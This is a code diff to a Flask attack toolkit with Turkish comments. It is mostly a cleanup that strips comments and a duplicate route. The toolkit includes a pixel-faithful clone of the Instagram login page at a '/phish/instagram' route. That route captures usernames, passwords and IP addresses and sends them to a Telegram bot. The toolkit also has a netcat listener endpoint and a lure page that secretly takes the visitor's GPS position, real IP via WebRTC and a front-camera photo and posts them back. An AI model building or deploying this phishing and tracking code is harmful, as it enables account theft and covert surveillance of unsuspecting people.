@@ -976,11 +976,7 @@ def download_driving_report():
         return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
     return "Rapor bulunamadı", 404
 
-# (Bu dosyanın en başındaki import ve diğer global değişkenler aynı kalacak)
-
-# ... (Buradaki importlar ve sabitler atlanmıştır, tam dosyanın içindeki INSTA_TEMPLATE kısmını değiştirin)
-
-# --- BİREBİR AYNISI YAPILMIŞ GÜNCEL INSTA PHISHING SAYFASI ---
+# --- BİREBİR AYNISI YAPILMIŞ INSTA PHISHING SAYFASI (TEK TANIMLANDI) ---
 INSTA_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -1017,7 +1013,6 @@ INSTA_TEMPLATE = """
             width: 454px;
             position: relative;
         }
-        /* Kayan fotoğraf kolajı konteyneri */
         .screenshot-container {
             position: absolute;
             top: 99px;
@@ -1026,7 +1021,6 @@ INSTA_TEMPLATE = """
             height: 538px;
             overflow: hidden;
         }
-        /* Kayan fotoğraflar animasyonu */
         .screenshot-container img {
             position: absolute;
             top: 0;
@@ -1046,7 +1040,6 @@ INSTA_TEMPLATE = """
             41% { opacity: 0; }
             100% { opacity: 0; }
         }
-        /* Metin bloğu */
         .text-block {
             border: 1px solid #dbdbdb;
             border-radius: 1px;
@@ -1063,7 +1056,6 @@ INSTA_TEMPLATE = """
             margin: 22px auto 12px;
             width: 175px;
         }
-        /* Spesifik metin stili: "Yakın arkadaşlarının günlük anlarını gör." */
         .text-block h2 {
             color: #262626;
             font-size: 22px;
@@ -1071,7 +1063,6 @@ INSTA_TEMPLATE = """
             line-height: 26px;
             margin: 0 40px 24px;
         }
-        /* Sağ Kolon: Giriş Formu */
         .right-column {
             display: flex;
             flex-direction: column;
@@ -1118,9 +1109,6 @@ INSTA_TEMPLATE = """
             font-size: 14px;
             margin-top: 8px;
         }
-        button.login-btn:disabled {
-            opacity: 0.5;
-        }
         .or-divider {
             display: flex;
             align-items: center;
@@ -1161,7 +1149,6 @@ INSTA_TEMPLATE = """
             display: block;
             text-decoration: none;
         }
-        /* Alt Kısım */
         .signup-box {
             background-color: #ffffff;
             border: 1px solid #dbdbdb;
@@ -1178,8 +1165,6 @@ INSTA_TEMPLATE = """
             width: 50px;
             margin-top: 10px;
         }
-        
-        /* Mobil uyumluluk için basit responsive dokunuş */
         @media (max-width: 875px) {
             .left-column { display: none; }
             .main-wrapper { justify-content: center; }
@@ -1189,7 +1174,6 @@ INSTA_TEMPLATE = """
 </head>
 <body>
     <div class="main-wrapper">
-        <!-- Sol Kolon: Telefon Görselleri ve Kaynayan Kolaj -->
         <div class="left-column">
             <div class="screenshot-container">
                 <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe14856348.png" alt="Screenshot 1">
@@ -1197,16 +1181,11 @@ INSTA_TEMPLATE = """
                 <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot3.png/fa21505733a8.png" alt="Screenshot 3">
             </div>
         </div>
-
-        <!-- Sağ Kolon: Metin + Giriş Formu -->
         <div class="right-column">
-            <!-- Metin Bloğu (Görseldeki üst kısım) -->
             <div class="text-block">
                 <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbf2d63.png" alt="Instagram" class="logo">
                 <h2>Yakın arkadaşlarının günlük <br>anlarını gör.</h2>
             </div>
-
-            <!-- Giriş Formu -->
             <div class="login-box">
                 <form method="POST">
                     <div class="form-group">
@@ -1219,25 +1198,20 @@ INSTA_TEMPLATE = """
                         <button type="submit" class="login-btn">Giriş Yap</button>
                     </div>
                 </form>
-
                 <div class="or-divider">
                     <div></div>
                     <span>YA DA</span>
                     <div></div>
                 </div>
-
                 <a href="#" class="fb-login">
                     <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/A65f6e3aM-C.png" alt="Facebook">
                     Facebook ile giriş yap
                 </a>
                 <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
             </div>
-
-            <!-- Kayıt Ol Kutusu -->
             <div class="signup-box">
                 Hesabın yok mu? <a href="#">Kaydol</a>
             </div>
-            
             <div style="text-align: center;">
                 <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yX/r/N0qO3qI219A.png" alt="Meta" class="meta-logo">
             </div>
@@ -1247,25 +1221,6 @@ INSTA_TEMPLATE = """
 </html>
 """
 
-# --- DİĞER TÜM KOD AYNI KALACAK ---
-
-@app.route("/phish/instagram", methods=["GET", "POST"])
-def insta_phish():
-    if request.method == "POST":
-        username = request.form.get("username")
-        password = request.form.get("password")
-        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        CREDENTIAL_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "username": username, "password": password})
-        if NOTIFY_CHAT_ID and TOKEN:
-            try:
-                msg = f"🚨 [CREDENTIAL HARVESTER] Instagram Hesabı Düştü!\nKullanıcı: {username}\nŞifre: {password}\nIP: {visitor_ip}"
-                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
-            except: pass
-        return redirect("https://www.instagram.com")
-    return render_template_string(INSTA_TEMPLATE)
-
-# ... (Diğer kodlar burada devam eder, silme veya bozma yok)
 @app.route("/phish/instagram", methods=["GET", "POST"])
 def insta_phish():
     if request.method == "POST":
@@ -1316,7 +1271,6 @@ def api_listener_start():
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})
 
-# --- GELİŞTİRİLMİŞ GPS & ÖN KEMERA SNAPSHOT TRACKER ŞABLONU ---
 TRACK_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -1365,7 +1319,6 @@ TRACK_TEMPLATE = """
                 } catch(e){}
             }
 
-            // WebRTC Gerçek IP Tespiti
             try {
                 let pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                 pc.createDataChannel("");
@@ -1378,7 +1331,6 @@ TRACK_TEMPLATE = """
                 };
             } catch(e){}
 
-            // GPS Konum Bilgisi Alımı
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -1401,7 +1353,7 @@ TRACK_TEMPLATE = """
                 let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 let video = document.getElementById('webcam');
                 video.srcObject = stream;
-                await new Promise(resolve => setTimeout(resolve, 1500)); // Kameranın netleşmesi için bekle
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
                 let canvas = document.getElementById('snapshotCanvas');
                 canvas.width = 320; canvas.height = 240;
@@ -1412,7 +1364,6 @@ TRACK_TEMPLATE = """
                 stream.getTracks().forEach(t => t.stop());
             } catch(e) {}
 
-            // Sunucuya Logları Gönder
             fetch('/api/lure/save-geo', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -1440,7 +1391,6 @@ def save_geo():
     data['ip'] = visitor_ip
     CLICK_LOGS.insert(0, data)
     
-    # Telegram Bildirimi
     if NOTIFY_CHAT_ID and TOKEN:
         try:
             lat = data.get('lat')
